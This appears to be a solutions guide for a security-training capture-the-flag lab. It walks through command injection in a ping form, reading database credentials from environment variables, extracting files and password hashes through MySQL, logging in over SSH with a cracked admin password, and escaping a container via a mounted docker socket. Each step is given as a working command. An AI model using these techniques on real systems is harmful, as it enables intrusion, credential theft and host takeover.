Lab 10 Solutions
======


### Challenge 1
We must first exploit the vulnerable ping function in order execute commands on the underlying webserver. This can be done using the standard command injection techniques showcased in lab 6. The following payload, for example, will execute the `whoami` command as the webserver user. This results in the webserver's username (`www-data`) being shown on the page's output:

```bash
8.8.8.8; whoami
```

Now that we have command execution, we need to gather the MySQL credentials used by the application in order to connect to the database directly. In this specific case, these credentials are stored via environmental variables. We can enumerate the environmental variables, and thus the DB credentials, using the `env` command:

```bash
8.8.8.8; env
```

This reveals the following DB credentials:

* MYSQL_HOST=db
* MYSQL_USER=dbuser
* MYSQL_PASSWORD=cisco123
* MYSQL_DATABASE=db

Next, we can use the existing command injection vulnerability to run SQL queries directly (and non-interactively) against the DB using a command like:

```bash
8.8.8.8; mysql -u dbuser -pcisco123 -h db db -e "SELECT @@version"
```

Since the goal is to read the flag located at `/var/lib/mysql-files/flag.txt`, we can leverage the MySQL `LOAD_FILE` command to grab the flag:

```bash
8.8.8.8; mysql -u dbuser -pcisco123 -h db db -e "SELECT LOAD_FILE('/var/lib/mysql-files/flag.txt')"
```


### Challenge 2

Next, we'll leverage our access to the database to identify useful credentials that can be used to move laterally through the underlying infrastructure. 

Upon further inspection of the database, you should notice a `users` table exists and holds hashed passwords for a variety of users:

```bash
8.8.8.8; mysql -u dbuser -pcisco123 -h db db -e "SELECT * FROM users"
```

In particular, the `admin` user has a hashed password (`1c395a8dce135849bd73c6dba3b54809`) that, when searched on Google, reveals a plaintext password of `88888`. These credentials can be used to connect to the SSH service on port `2222`:

```bash
ssh -oPort=2222 admin@ip
```

After logging in as the `admin` user, simply cat the `flag.txt` file in the admin's home directory.


### Challenge 3

Note that in order to interact with the docker socket, we do need to be `root` inside our container:

```bash
sudo su
cd ~
```

Since the docker socket (`/var/run/docker.sock`) is mounted into our container from the underlying host, we can use the docker utility itself to interact with the underlying host. Since docker is not installed inside the container (for obvious reasons), we should first download a binary copy of docker:

```bash
wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.5.tgz
tar -xvf docker-20.10.5.tgz
cd docker
```

Now, when we run any docker commands using the downloaded `docker` binary, these commands are actually running on the underlying host since its docker socket has been passed into our container. 

Next, we can break out of our container and into the host by asking docker to mount the underlying host's filesystem to `/host`, spin up an ubuntu container, and chroot its filesystem: 

```bash
./docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```

This results in the spun up container having a filesystem that's directly mapped to the underlying host's filesystem!

